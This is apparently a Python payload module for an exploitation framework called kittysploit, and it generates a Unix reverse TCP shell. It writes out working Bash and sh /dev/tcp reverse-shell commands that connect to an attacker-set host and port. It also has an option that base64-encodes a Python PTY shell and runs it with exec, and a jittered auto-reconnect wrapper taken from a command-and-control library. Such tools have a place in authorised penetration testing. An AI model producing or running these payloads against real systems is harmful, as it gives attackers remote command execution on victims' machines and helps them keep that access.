from kittysploit import *

from lib.shell.pty_runtime import build_unix_pty_script


class Module(Payload):

	CLIENT_LANGUAGE = "python"

	__info__ = {
		'name': 'Unix Command Shell, Reverse TCP (via Bash)',
		'description': 'Connect back and create a command shell via Bash /dev/tcp (PTY via Python when use_pty=true)',
		'category': PayloadCategory.CMD,
		'platform': Platform.UNIX,
		'listener': 'listeners/multi/reverse_tcp',
		'handler': Handler.REVERSE
	}

	lhost = OptString('127.0.0.1', 'Connect to IP address', True)
	lport = OptPort(4444, 'Connect to port', True)
	encoder = OptString("", "Encoder", False, True)
	shell_binary = OptChoice('bash', 'The system shell in use [bash, sh]', True, choices=['bash', 'sh'])
	use_pty = OptBool(True, 'Use Python PTY stub (tab completion, sudo); falls back to bash /dev/tcp if false', False, True)
	python_binary = OptString('python3', 'Python interpreter when use_pty=true', False, True)
	reconnect = OptBool(True, 'Reconnect with jitter after disconnect (bash mode only)', False, True)
	reconnect_interval = OptInteger(15, 'Base reconnect delay seconds', False, True)
	jitter_percent = OptInteger(35, 'Reconnect jitter percent', False, True)

	def generate(self):
		"""Generate bash reverse TCP payload using /dev/tcp"""
		host = str(self.lhost)
		port = int(self.lport)
		shell = '/bin/bash' if self.shell_binary == 'bash' else '/bin/sh'

		if bool(self.use_pty):
			py = str(self.python_binary)
			script = build_unix_pty_script(host, port, shell)
			if bool(self.reconnect):
				from lib.c2.tcp_resilience import build_python_reconnect_wrapper, parse_cover_endpoints

				script = build_python_reconnect_wrapper(
					script,
					reconnect_interval=float(self.reconnect_interval or 15),
					jitter_percent=float(self.jitter_percent or 35),
					cover_endpoints=(),
				)
			import base64 as b64
			encoded = b64.b64encode(script.encode('utf-8')).decode('ascii')
			return f"{py} -c \"import base64;exec(base64.b64decode('{encoded}').decode())\""

		if self.shell_binary == 'bash':
			payload = f"bash -c 'exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'"
		else:
			payload = f"sh -i >& /dev/tcp/{host}/{port} 0>&1"

		if bool(self.reconnect):
			from lib.c2.tcp_resilience import build_bash_reconnect_wrapper

			payload = build_bash_reconnect_wrapper(
				payload,
				reconnect_interval=float(self.reconnect_interval or 15),
				jitter_percent=float(self.jitter_percent or 35),
			)

		return payload
